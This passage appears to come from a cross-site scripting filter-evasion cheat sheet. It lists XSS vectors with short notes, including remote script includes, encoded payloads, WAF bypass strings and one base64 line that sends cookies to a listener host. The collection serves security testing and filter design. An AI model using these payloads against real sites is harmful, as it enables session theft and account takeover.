playList)\r\n102. `onUndo()` (user went backward in undo transaction history)\r\n103. `onUnload()` (as the user clicks any link or presses the back button or attacker forces a click)\r\n104. `onURLFlip()` (this event fires when an Advanced Streaming Format (ASF) file, played by a HTML+TIME (Timed Interactive Multimedia Extensions) media tag, processes script commands embedded in the ASF file)\r\n105. `seekSegmentTime()` (this is a method that locates the specified point on the element's segment time line and begins playing from that point. The segment consists of one repetition of the time line including reverse play using the AUTOREVERSE attribute.)\r\n\r\n### BGSOUND\r\n\r\n`<BGSOUND SRC=\"javascript:alert('XSS');\">`\r\n\r\n### & JavaScript includes\r\n\r\n`<BR SIZE=\"&{alert('XSS')}\">`\r\n\r\n### STYLE sheet\r\n\r\n`<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">`\r\n\r\n### Remote style sheet\r\n\r\nUsing something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won't work unless there is some content on the page other than the vector itself, so you'll need to add a single letter to the page to make it work if it's an otherwise blank page:\r\n\r\n`<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">`\r\n\r\n### Remote style sheet part 2\r\n\r\nThis works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used\r\nto hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:\r\n\r\n`<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`\r\n\r\n### Remote style sheet part 3\r\n\r\nThis only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying `Link: <http://xss.rocks/xss.css>; REL=stylesheet`) and the remote style sheet with my cross site scripting vector is running the JavaScript, which is not supported in FireFox:\r\n\r\n`<META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\">`\r\n\r\n### Remote style sheet part 4\r\n\r\nThis only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefore is vulnerable to this for the vast majority of sites:\r\n\r\n`<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>`\r\n\r\n### STYLE Tags with Broken-up JavaScript for XSS\r\n\r\nThis XSS at times sends IE into an infinite loop of alerts:\r\n\r\n`<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>`\r\n\r\n### STYLE Attribute using a Comment to Break-up Expression\r\n\r\nCreated by Roman Ivanov\r\n\r\n`<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">`\r\n\r\n### IMG STYLE with Expression\r\n\r\nThis is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:\r\n\r\n```\r\nexp/*<A STYLE='no\\xss:noxss(\"*//*\");\r\nxss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>\r\n```\r\n\r\n### STYLE Tag (Older versions of Netscape only)\r\n\r\n`<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>`\r\n\r\n### STYLE Tag using Background-image\r\n\r\n`<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>`\r\n\r\n### STYLE Tag using Background\r\n\r\n`<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>`\r\n`<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>`\r\n\r\n### Anonymous HTML with STYLE Attribute\r\n\r\nIE6.0 and Netscape 8.1+ in IE rendering engine mode don't really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:\r\n\r\n`<XSS STYLE=\"xss:expression(alert('XSS'))\">`\r\n\r\n### Local htc File\r\n\r\nThis is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:\r\n\r\n`<XSS STYLE=\"behavior: url(xss.htc);\">`\r\n\r\n### US-ASCII Encoding\r\n\r\nUS-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.\r\n\r\n`¼script¾alert(¢XSS¢)¼/script¾`\r\n\r\n### META\r\n\r\nThe odd thing about meta refresh is that it doesn't send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:\r\n\r\n`<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">`\r\n\r\n#### META using Data\r\n\r\nDirective URL scheme. This is nice because it also doesn't have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS [calculator](http://ha.ckers.org/xsscalc.html) below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:\r\n\r\n`<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">`\r\n\r\n#### META with Additional URL Parameter\r\n\r\nIf the target website attempts to see if the URL contains `<http://>;` at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):\r\n\r\n`<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">`\r\n\r\n### IFRAME\r\n\r\nIf iframes are allowed there are a lot of other XSS problems as well:\r\n\r\n`<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>`\r\n\r\n### IFRAME Event Based\r\n\r\nIFrames and most other elements can use event based mayhem like the following... (Submitted by: David Cross)\r\n\r\n`<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>`\r\n\r\n### FRAME\r\n\r\nFrames have the same sorts of XSS problems as iframes\r\n\r\n`<FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET>`\r\n\r\n### TABLE\r\n\r\n`<TABLE BACKGROUND=\"javascript:alert('XSS')\">`\r\n\r\n#### TD\r\n\r\nJust like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:\r\n\r\n`<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">`\r\n\r\n### DIV\r\n\r\n#### DIV Background-image\r\n\r\n`<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">`\r\n\r\n#### DIV Background-image with Unicoded XSS Exploit\r\n\r\nThis has been modified slightly to obfuscate the URL parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:\r\n\r\n`<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">`\r\n\r\n#### DIV Background-image Plus Extra Characters\r\n\r\nRnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):\r\n\r\n`<DIV STYLE=\"background-image: url(\u0001javascript:alert('XSS'))\">`\r\n\r\n#### DIV Expression\r\n\r\nA variant of this was effective against a real world cross site scripting filter using a newline between the colon and \"expression\":\r\n\r\n`<DIV STYLE=\"width: expression(alert('XSS'));\">`\r\n\r\n### Downlevel-Hidden Block\r\n\r\nOnly works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn't do the job:\r\n\r\n```\r\n<!--[if gte IE 4]>\r\n<SCRIPT>alert('XSS');</SCRIPT>\r\n<![endif]-->\r\n```\r\n\r\n### BASE Tag\r\n\r\nWorks in IE and Netscape 8.1 in safe mode. You need the `//` to comment out the next characters so you won't get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like `images/image.jpg` rather than full paths. If the path includes a leading forward slash like `/images/image.jpg` you can remove one slash from this vector (as long as there are two to begin the comment this will work):\r\n\r\n`<BASE HREF=\"javascript:alert('XSS');//\">`\r\n\r\n### OBJECT Tag\r\n\r\nIf they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:\r\n\r\n`<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>`\r\n\r\n### EMBED a Flash Movie That Contains XSS\r\n\r\n<!-- markdownlint-disable MD034-->\r\nClick here for a demo: ~~http://ha.ckers.org/xss.swf~~\r\n<!-- markdownlint-enable MD034-->\r\n\r\n`<EMBED SRC=\"http://ha.ckers.org/xss.swf\" AllowScriptAccess=\"always\"></EMBED>`\r\n\r\nIf you add the attributes `allowScriptAccess=\"never\"` and `allownetworking=\"internal\"` it can mitigate\r\nthis risk (thank you to Jonathan Vanasco for the info).\r\n\r\n### EMBED SVG Which Contains XSS Vector\r\n\r\nThis example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.\r\n\r\n`<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>`\r\n\r\n### Using ActionScript Inside Flash for Obfuscation\r\n\r\n```\r\na=\"get\";\r\nb=\"URL(\\\"\";\r\nc=\"javascript:\";\r\nd=\"alert('XSS');\\\")\"; \r\neval(a+b+c+d);\r\n```\r\n\r\n### XML Data Island with CDATA Obfuscation\r\n\r\nThis XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:\r\n\r\n```\r\n<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML> \r\n<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>\r\n```\r\n\r\n### Locally hosted XML with embedded JavaScript that is generated using an XML data island\r\n\r\nThis is the same as above but instead refers to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:\r\n\r\n```\r\n<XML SRC=\"xsstest.xml\" ID=I></XML>  \r\n<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>\r\n```\r\n\r\n### HTML+TIME in XML\r\n\r\nThis is how Grey Magic hacked Hotmail and Yahoo\\!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:\r\n\r\n```\r\n<HTML><BODY>\r\n<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">\r\n<?import namespace=\"t\" implementation=\"#default#time2\">\r\n<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">\r\n</BODY></HTML>\r\n```\r\n\r\n### Assuming you can only fit in a few characters and it filters against `.js`\r\n\r\nYou can rename your JavaScript file to an image as an XSS vector:\r\n\r\n`<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>`\r\n\r\n### SSI (Server Side Includes)\r\n\r\nThis requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:\r\n\r\n`<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->`\r\n\r\n### PHP\r\n\r\nRequires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:\r\n\r\n```php\r\n<? echo('<SCR)';\r\necho('IPT>alert(\"XSS\")</SCRIPT>'); ?>\r\n```\r\n\r\n### IMG Embedded Commands\r\n\r\nThis works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:\r\n\r\n`<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">`\r\n\r\n#### IMG Embedded Commands part II\r\n\r\nThis is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal `<IMG SRC=\"httx://badguy.com/a.jpg\">` could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):\r\n\r\n`Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser`\r\n\r\n### Cookie Manipulation\r\n\r\nAdmittedly this is pretty obscure but I have seen a few examples where `<META` is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...):\r\n\r\n`<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">`\r\n\r\n### UTF-7 Encoding\r\n\r\nIf the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.:\r\n\r\n`<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`\r\n\r\n### XSS Using HTML Quote Encapsulation\r\n\r\nThis was tested in IE, your mileage may vary. For performing XSS on sites that allow `<SCRIPT>` but don't allow `<SCRIPT SRC...` by way of a regex filter `/\\<script\\[^\\>\\]+src/i`:\r\n\r\n`<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\nFor performing XSS on sites that allow `<SCRIPT>` but don't allow `\\<script src...` by way of a regex filter `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` (this is an important one, because I've seen this regex in the wild):\r\n\r\n`<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\nAnother XSS to evade the same filter, `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`:\r\n\r\n`<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\nYet another XSS to evade the same filter, `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i`. I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow `<SCRIPT>` tags but not remote script is a state machine (and of course there are other ways to get around this if they allow `<SCRIPT>` tags):\r\n\r\n`<SCRIPT \"a='>'\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\nAnd one last XSS attack to evade, `/\\<script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\>\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i` using grave accents (again, doesn't work in Firefox):\r\n\r\n<!-- markdownlint-disable MD038-->\r\n`<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n<!-- markdownlint-enable MD038-->\r\n\r\nHere's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:\r\n\r\n`<SCRIPT a=\">'>\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\nThis XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:\r\n\r\n`<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>`\r\n\r\n### URL String Evasion\r\n\r\nAssuming `http://www.google.com/` is programmatically disallowed:\r\n\r\n#### IP Versus Hostname\r\n\r\n`<A HREF=\"http://66.102.7.147/\">XSS</A>`\r\n\r\n#### URL Encoding\r\n\r\n`<A HREF=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\">XSS</A>`\r\n\r\n#### DWORD Encoding\r\n\r\nNote: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:\r\n\r\n`<A HREF=\"http://1113982867/\">XSS</A>`\r\n\r\n#### Hex Encoding\r\n\r\nThe total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):\r\n\r\n`<A HREF=\"http://0x42.0x0000066.0x7.0x93/\">XSS</A>`\r\n\r\n#### Octal Encoding\r\n\r\nAgain padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...:\r\n\r\n`<A HREF=\"http://0102.0146.0007.00000223/\">XSS</A>`\r\n\r\n#### Base64 Encoding\r\n\r\n`<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">`\r\n\r\n#### Mixed Encoding\r\n\r\nLet's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:\r\n\r\n<!-- markdownlint-disable MD010-->\r\n```html\r\n<A HREF=\"h \r\ntt  p://6\t6.000146.0x7.147/\">XSS</A>\r\n```\r\n<!-- markdownlint-enable MD010-->\r\n\r\n#### Protocol Resolution Bypass\r\n\r\n`//` translates to `http://` which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like `(ht|f)tp(s)?://` (thanks to Ozh for part of this one). You can also change the `//` to `\\\\\\\\`. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.\r\n\r\n`<A HREF=\"//www.google.com/\">XSS</A>`\r\n\r\n#### Google \"feeling lucky\" part 1\r\n\r\nFirefox uses Google's \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's `keyword:` protocol. You can concatenate several keywords by using something like the following `keyword:XSS+RSnake` for instance. This no longer works within Firefox as of 2.0.\r\n\r\n`<A HREF=\"//google\">XSS</A>`\r\n\r\n#### Google \"feeling lucky\" part 2\r\n\r\nThis uses a very tiny trick that appears to work Firefox only, because of it's implementation of the \"feeling lucky\" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:\r\n\r\n`<A HREF=\"http://ha.ckers.org@google\">XSS</A>`\r\n\r\n#### Google \"feeling lucky\" part 3\r\n\r\nThis uses a malformed URL that appears to work in Firefox and Opera only, because of their implementation of the \"feeling lucky\" function. Like all of the above it requires that you are \\#1 in Google for the keyword in question (in this case \"google\"):\r\n\r\n`<A HREF=\"http://google:ha.ckers.org\">XSS</A>`\r\n\r\n#### Removing CNAMEs\r\n\r\nWhen combined with the above URL, removing `www.` will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):\r\n\r\n`<A HREF=\"http://google.com/\">XSS</A>`\r\n\r\nExtra dot for absolute DNS:\r\n\r\n`<A HREF=\"http://www.google.com./\">XSS</A>`\r\n\r\n#### JavaScript Link Location\r\n\r\n`<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>`\r\n\r\n#### Content Replace as Attack Vector\r\n\r\n<!-- markdownlint-disable MD010-->\r\nAssuming `http://www.google.com/` is programmatically replaced with nothing). I actually used a similar attack vector against several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: `java&\\#x09;script:` was converted into `java\tscript:`, which renders in IE, Netscape 8.1+ in secure site mode and Opera):\r\n<!-- markdownlint-enable MD010-->\r\n\r\n`<A HREF=\"http://www.google.com/ogle.com/\">XSS</A>`\r\n\r\n### Assisting XSS with HTTP Parameter Pollution\r\n\r\nAssume a content sharing flow on a web site is implemented as shown below. There is a \"Content\" page which includes some content provided by users and this page also includes a link to \"Share\" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the \"title\" parameter in the \"Content\" page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the \"Share\" page.\r\n\r\n#### Content Page Source Code\r\n\r\n`a href=\"/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>\">Share</a>`\r\n\r\n#### Share Page Source Code\r\n\r\n```js\r\n<script>\r\nvar contentType = <%=Request.getParameter(\"content_type\")%>;\r\nvar title = \"<%=Encode.forJavaScript(request.getParameter(\"title\"))%>\";\r\n...\r\n//some user agreement and sending to server logic might be here\r\n...\r\n</script>\r\n```\r\n\r\n#### Content Page Output\r\n\r\nIn this case if attacker set untrusted content title as “This is a regular title&content_type=1;alert(1)” the link in \"Content\" page would be this:\r\n\r\n`<a href=\"/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)\">Share</a>`\r\n\r\n#### Share Page Output\r\n\r\nAnd in share page output could be this:\r\n\r\n```js\r\n<script>\r\nvar contentType = 1; alert(1);\r\nvar title = \"This is a regular title\";\r\n…\r\n//some user agreement and sending to server logic might be here\r\n…\r\n</script>\r\n```\r\n\r\nAs a result, in this example the main flaw is trusting the content_type in the \"Share\" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.\r\n\r\n## Character Escape Sequences\r\n\r\nAll the possible combinations of the character \"\\<\" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.\r\n\r\n- `<`\r\n- `%3C`\r\n- `&lt`\r\n- `&lt;`\r\n- `&LT`\r\n- `&LT;`\r\n- `&#60`\r\n- `&#060`\r\n- `&#0060`\r\n- `&#00060`\r\n- `&#000060`\r\n- `&#0000060`\r\n- `&#60;`\r\n- `&#060;`\r\n- `&#0060;`\r\n- `&#00060;`\r\n- `&#000060;`\r\n- `&#0000060;`\r\n- `&#x3c`\r\n- `&#x03c`\r\n- `&#x003c`\r\n- `&#x0003c`\r\n- `&#x00003c`\r\n- `&#x000003c`\r\n- `&#x3c;`\r\n- `&#x03c;`\r\n- `&#x003c;`\r\n- `&#x0003c;`\r\n- `&#x00003c;`\r\n- `&#x000003c;`\r\n- `&#X3c`\r\n- `&#X03c`\r\n- `&#X003c`\r\n- `&#X0003c`\r\n- `&#X00003c`\r\n- `&#X000003c`\r\n- `&#X3c;`\r\n- `&#X03c;`\r\n- `&#X003c;`\r\n- `&#X0003c;`\r\n- `&#X00003c;`\r\n- `&#X000003c;`\r\n- `&#x3C`\r\n- `&#x03C`\r\n- `&#x003C`\r\n- `&#x0003C`\r\n- `&#x00003C`\r\n- `&#x000003C`\r\n- `&#x3C;`\r\n- `&#x03C;`\r\n- `&#x003C;`\r\n- `&#x0003C;`\r\n- `&#x00003C;`\r\n- `&#x000003C;`\r\n- `&#X3C`\r\n- `&#X03C`\r\n- `&#X003C`\r\n- `&#X0003C`\r\n- `&#X00003C`\r\n- `&#X000003C`\r\n- `&#X3C;`\r\n- `&#X03C;`\r\n- `&#X003C;`\r\n- `&#X0003C;`\r\n- `&#X00003C;`\r\n- `&#X000003C;`\r\n- `\\x3c`\r\n- `\\x3C`\r\n- `\\u003c`\r\n- `\\u003C`\r\n\r\n## Methods to Bypass WAF – Cross-Site Scripting\r\n\r\n### General issues\r\n\r\n#### Stored XSS\r\n\r\nIf an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.\r\n\r\n#### Reflected XSS in JavaScript\r\n\r\n```\r\nExample: <script> ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... </script>\r\nExploitation: /?xss=500); alert(document.cookie);//\r\n```\r\n\r\n#### DOM-based XSS\r\n\r\n```\r\nExample: <script> ... eval($\\_GET\\[xss\\]); ... </script>\r\nExploitation: /?xss=document.cookie\r\n```\r\n\r\n#### XSS via request Redirection\r\n\r\n- Vulnerable code:\r\n\r\n```\r\n...\r\nheader('Location: '.$_GET['param']);\r\n...\r\n```\r\n\r\nAs well as:\r\n\r\n```\r\n..\r\nheader('Refresh: 0; URL='.$_GET['param']); \r\n...\r\n```\r\n\r\n- This request will not pass through the WAF:\r\n\r\n`/?param=<javascript:alert(document.cookie>)`\r\n\r\n- This request will pass through the WAF and an XSS attack will be conducted in certain browsers.\r\n\r\n`/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`\r\n\r\n### WAF ByPass Strings for XSS\r\n\r\n<!-- markdownlint-disable MD038-->\r\n- `<Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\">`\r\n- `<Video> <source onerror = \"javascript: alert (XSS)\">`\r\n- `<Input value = \"XSS\" type = text>`\r\n- `<applet code=\"javascript:confirm(document.cookie);\">`\r\n- `<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">`\r\n- `\"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`\r\n- `\"><img src=\"x:x\" onerror=\"alert(XSS)\">`\r\n- `\"><iframe src=\"javascript:alert(XSS)\">`\r\n- `<object data=\"javascript:alert(XSS)\">`\r\n- `<isindex type=image src=1 onerror=alert(XSS)>`\r\n- `<img src=x:alert(alt) onerror=eval(src) alt=0>`\r\n- `<img  src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>`\r\n- `<iframe/src=\"data:text/html,<svg onload=alert(1)>\">`\r\n- `<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>`\r\n- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`\r\n- `<meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\">`\r\n- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`\r\n- `<form><a href=\"javascript:\\u0061lert(1)\">X`\r\n- `</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>`\r\n- `<style>//*{x:expression(alert(/xss/))}//<style></style>`\r\n- On Mouse Over​\r\n- `<img src=\"/\" =_=\" title=\"onerror='prompt(1)'\">`\r\n- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`\r\n- `<script x> alert(1) </script 1=2`\r\n- `<form><button formaction=javascript&colon;alert(1)>CLICKME`\r\n- `<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"`\r\n- `<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>`\r\n- `<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT> `\r\n<!-- markdownlint-enable MD038-->\r\n\r\n### Filter Bypass Alert Obfuscation\r\n\r\n- `(alert)(1)`\r\n- `a=alert,a(1)`\r\n- `[1].find(alert)`\r\n- `top[“al”+”ert”](1)`\r\n- `top[/al/.source+/ert/.source](1)`\r\n- `al\\u0065rt(1)`\r\n- `top[‘al\\145rt’](1)`\r\n- `top[‘al\\x65rt’](1)`\r\n- `top[8680439..toString(30)](1)`\r\n- `alert?.()`\r\n- &#96;`${alert``}`&#96; (The payload should include leading and trailing backticks.)\r\n- `(alert())`\r\n"
    },
    {
